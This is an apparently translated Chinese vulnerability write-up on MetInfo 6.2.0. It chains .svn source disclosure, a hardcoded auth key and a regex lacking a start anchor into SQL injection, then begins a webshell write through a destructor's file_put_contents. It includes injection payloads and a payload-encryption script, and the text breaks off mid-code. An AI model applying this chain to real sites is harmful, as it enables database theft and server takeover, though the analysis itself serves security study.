# metinfo 6.2.0正则匹配不严谨导致注入+getshell组合拳
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
今天公司做技术分享，分享了项目中的一个攻击metinfo的案例，很有意思的攻击链，记录下。
## svn泄露
svn是一个开放源代码的版本控制系统，如果在网站中存在`.svn`目录，那么我们可以拿到网站的源代码，方便审计。关于svn泄露需要注意的是SVN 版本
>1.7 时，Seay的工具不能dump源码了。可以用[@admintony](https://github.com/admintony
"@admintony")师傅的脚本来利用 
在目标站中发现了`http://php.local/.svn/`目录泄露源代码，发现是metinfo
cms，拿到了位于`config/config_safe.php`中的key，这个key起到了很大作用。
什么是key呢？为什么要有这个key呢？
在metinfo安装完成后，会在`config/config_safe.php`写入一个key，这个key是用来加密解密账户信息的，你可以在`app/system/include/class/auth.class.php`看到加解密算法。
可以看到加解密采用了`$this->auth_key.$key`作为盐值，`$key`默认为空，那么这个`$this->auth_key`在哪定义的呢？
config/config.inc.php:109
有了这个key，我们可以自己针对性去加密解密程序密文。
有什么用呢？大部分的cms都会有全局参数过滤，而metinfo的全局过滤简直变态，我们很难直接从request中找到可用的sql注入，
**而加了密之后的参数一半不会再进行过滤了** ，我们可以找下可控的加密参数。
## 正则匹配导致的注入
全局搜索`$auth->decode`寻找可控的参数，并且不走过滤的。
app/system/user/web/getpassword.class.php:93
    public function dovalid() {
        global $_M;
        $auth = load::sys_class('auth', 'new');
        $email = $auth->decode($_M['form']['p']);
        if(!is_email($email))$email = '';
        if($email){
            if($_M['form']['password']){
                $user = $this->userclass->get_user_by_email($email);
                if($user){
                    if($this->userclass->editor_uesr_password($user['id'],$_M['form']['password'])){
                        okinfo($_M['url']['login'], $_M['word']['modifypasswordsuc']);
                    }else{
                        okinfo($_M['url']['login'], $_M['word']['opfail']);
                    }
                }else{
                    okinfo($_M['url']['login'], $_M['word']['NoidJS']);
                }
            }
            require_once $this->view('app/getpassword_mailset',$this->input);
        }else{
            okinfo($_M['url']['register'], $_M['word']['emailvildtips2']);
        }
    }
可以看到`$email`直接从`$_M['form']['p']`中经过`$auth->decode` **解密**
获取，并没有进行过滤，然后在`get_user_by_email($email)`中代入数据库查询。但是经过了`is_email($email)`判断是否为正确的邮箱地址。
跟进app/system/include/function/str.func.php:26
    function is_email($email){
        $flag = true;
        $patten = '/[w-]+@[w-]+.[a-zA-Z.]*[a-zA-Z]$/';
        if(preg_match($patten, $email) == 0){
            $flag = false;
        }
        return $flag;
    }
很正常的正则表达式， **但是唯一缺少的是`^`起始符！**那么我们构造如`' and 1=1--[PI:EMAIL](mailto:PI:EMAIL)`也会返回true！
email要经过`$auth->decode`解密，这个时候我们的key就派上用场了，我们可以使用`$auth->encode()`来加密我们的payload传进去，构成注入。
将auth类自己搞一份出来。
     0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        }else{
            return $keyc.str_replace('=', '', base64_encode($result));
        }
    }
    print_r(urlencode(authcode($_GET['p'],'ENCODE','cqQWPRhV91To7PmrI5Dd3FGIxjMQpLmt','0')));
需要注意这个`[PI:EMAIL](mailto:PI:EMAIL)`是你自己注册的用户，如果`met_user`表中不存在一条记录，是延时不了的。
延时成功，你也可以构造布尔盲注，到此为止就是注入的部分，但是我们的目标是拿权限，一个注入就满足了？
## 组合拳
app/system/include/class/web.class.php:467 省略部分代码
    public function __destruct(){
        global $_M;
        //读取缓冲区数据
        $output = str_replace(array('','','','','',"r",substr($admin_url,0,-1)),'',ob_get_contents());
        ob_end_clean();//清空缓冲区
    ...
        if($_M['form']['html_filename'] && $_M['form']['metinfonow'] == $_M['config']['met_member_force']){
            //静态页
            $filename = urldecode($_M['form']['html_filename']);
            if(stristr(PHP_OS,"WIN")) {
                $filename = @iconv("utf-8", "GBK", $filename);
            }
            if(stristr($filename, '.php')){
                jsoncallback(array('suc'=>0));
            }
            if(file_put_contents(PATH_WEB.$filename, $output)){
                jsoncallback(array('suc'=>1));
            }else{
                jsoncallback(array('suc'=>0));
            }
        }else{
            echo $output;//输出内容
        }
    ...
    }
在前台基类web.class.php中有`__destruct`魔术方法，而在这个方法中使用`file_put_contents(PATH_WEB.$filename,
$output`写入文件，其中`$output`是通过`ob_get_contents()`获取的缓冲区数据，而`$filename`是从`$_M['form']['html_filename']`拿出来的，我们可控。
但是有一个if条件`$_M['form']['metinfonow'] ==
$_M['config']['met_member_force']`，这个`met_member_force`在哪呢？在数据库里，我们可以通过刚才的注入拿到！
那么我们现在的目的就变为怎么去控制`$output`也就是缓冲区的值。
>
> ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。
也就是说我们只要找到web.class.php或者继承web.class.php的子类中有可控的echo输出，配合刚才的注入便可以写入shell。
全局搜索`extends
web`寻找子类，在子类中寻找可控echo输出，最终找到的是`app/system/include/module/uploadify.class.php`的doupfile()方法
    public function set_upload($info){
        global $_M;
        $this->upfile->set('savepath', $info['savepath']);
        $this->upfile->set('format', $info['format']);
        $this->upfile->set('maxsize', $info['maxsize']);
        $this->upfile->set('is_rename', $info['is_rename']);
        $this->upfile->set('is_overwrite', $info['is_overwrite']);
    }
    ...
    public function upload($formname){
        global $_M;